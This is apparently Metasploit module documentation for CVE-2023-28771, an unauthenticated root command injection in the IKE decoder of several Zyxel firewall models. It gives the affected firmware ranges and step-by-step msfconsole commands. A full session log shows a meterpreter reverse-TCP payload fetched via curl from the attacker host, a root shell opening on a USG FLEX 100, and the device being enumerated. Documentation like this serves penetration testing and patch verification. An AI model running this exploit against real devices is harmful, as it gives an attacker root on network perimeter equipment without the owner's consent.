## Vulnerable Application
This module exploits a remote unauthenticated command injection vulnerability in the Internet Key Exchange
(IKE) packet decoder over UDP port 500 on the WAN interface of several Zyxel devices. The affected devices are
as follows:

* ATP (Firmware version 4.60 to 5.35 inclusive)
* USG FLEX (Firmware version 4.60 to 5.35 inclusive),
* VPN (Firmware version 4.60 to 5.35 inclusive)
* ZyWALL/USG (Firmware version 4.60 to 4.73 inclusive).

The affected devices are vulnerable in a default configuration and command execution is with root privileges. For a
full technical analysis of the vulnerability read the
[Rapid7 AttackerKB Analysis](https://attackerkb.com/topics/N3i8dxpFKS/cve-2023-28771/rapid7-analysis).

## Testing
A physical device is required for testing. The device must be running a vulnerable firmware version prior to the
vendor patch. A Zyxel USG FLEX 100 device was used during development and testing of this Metasploit module.

The attacker must be able to send UDP data to port 500 on the WAN interface of the affected network device.

## Verification Steps
1. Start msfconsole
2. `use exploit/linux/misc/zyxel_ike_decoder_rce_cve_2023_28771`
3. `set RHOST <TARGET_WAN_IP>`
4. `set LHOST eth0`
5. `set FETCH_SRVHOST eth0`
6. `check`
7. `exploit`
8. The default target `0` uses a `cmd/linux/http/mips64/meterpreter_reverse_tcp` payload. A meterpreter session with
root privileges should be created.

## Scenarios

### Default Target (Zyxel USG FLEX 100)
```
msf6 > use exploit/linux/misc/zyxel_ike_decoder_rce_cve_2023_28771
[*] Using configured payload cmd/linux/http/mips64/meterpreter_reverse_tcp
msf6 exploit(linux/misc/zyxel_ike_decoder_rce_cve_2023_28771) >
msf6 exploit(linux/misc/zyxel_ike_decoder_rce_cve_2023_28771) > set RHOSTS 192.168.86.40
RHOSTS => 192.168.86.40
msf6 exploit(linux/misc/zyxel_ike_decoder_rce_cve_2023_28771) > set LHOST eth0
LHOST => 192.168.86.42
msf6 exploit(linux/misc/zyxel_ike_decoder_rce_cve_2023_28771) > set FETCH_SRVHOST eth0
FETCH_SRVHOST => 192.168.86.42
msf6 exploit(linux/misc/zyxel_ike_decoder_rce_cve_2023_28771) > show options 

Module options (exploit/linux/misc/zyxel_ike_decoder_rce_cve_2023_28771):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  192.168.86.40    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT   500              yes       The target port (UDP)


Payload options (cmd/linux/http/mips64/meterpreter_reverse_tcp):

   Name                Current Setting  Required  Description
   ----                ---------------  --------  -----------
   FETCH_COMMAND       CURL             yes       Command to fetch payload (Accepted: CURL, FTP, TFTP, TNFTP, WGET)
   FETCH_DELETE        false            yes       Attempt to delete the binary after execution
   FETCH_FILENAME      luAxlQjv         no        Name to use on remote system when storing payload; cannot contain spaces.
   FETCH_SRVHOST       192.168.86.42    yes       Local IP to use for serving payload
   FETCH_SRVPORT       8080             yes       Local port to use for serving payload
   FETCH_URIPATH                        no        Local URI to use for serving payload
   FETCH_WRITABLE_DIR  /tmp             yes       Remote writable dir to store payload; cannot contain spaces.
   LHOST               192.168.86.42    yes       The listen address (an interface may be specified)
   LPORT               4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Default



View the full module info with the info, or info -d command.

msf6 exploit(linux/misc/zyxel_ike_decoder_rce_cve_2023_28771) > check
[*] 192.168.86.40:500 - The service is running, but could not be validated. IKE detected but device vendor and service version are unknown.
msf6 exploit(linux/misc/zyxel_ike_decoder_rce_cve_2023_28771) > exploit

[*] Started reverse TCP handler on 192.168.86.42:4444 
[*] Meterpreter session 1 opened (192.168.86.42:4444 -> 192.168.86.40:48310) at 2023-06-09 09:24:32 +0100

meterpreter > getuid
Server username: root
meterpreter > sysinfo
Computer     : 192.168.86.40
OS           :  (Linux 3.10.87-rt80-Cavium-Octeon)
Architecture : mips64
BuildTuple   : mips64-linux-muslsf
Meterpreter  : mips64/linux
meterpreter > cat /zyinit/fwversion 
KERNEL_VERSION=3.10.87
FIRMWARE_VER=5.20(ABUH.0)520-r102903-k3
CAPWAP_VER=1.00.04
COMPATIBLE_PRODUCT_MODEL_0=E15D
COMPATIBLE_PRODUCT_MODEL_1=FFFF
COMPATIBLE_PRODUCT_MODEL_2=FFFF
COMPATIBLE_PRODUCT_MODEL_3=FFFF
COMPATIBLE_PRODUCT_MODEL_4=FFFF
MODEL_ID=USG FLEX 100
KERNEL_BUILD_DATE=2022-01-04 16:14:50
BUILD_DATE=2022-01-04 18:13:20
FSH_VER=1.0.0
meterpreter > exit
[*] Shutting down Meterpreter...

[*] 192.168.86.40 - Meterpreter session 1 closed.  Reason: Died
msf6 exploit(linux/misc/zyxel_ike_decoder_rce_cve_2023_28771) > 
```
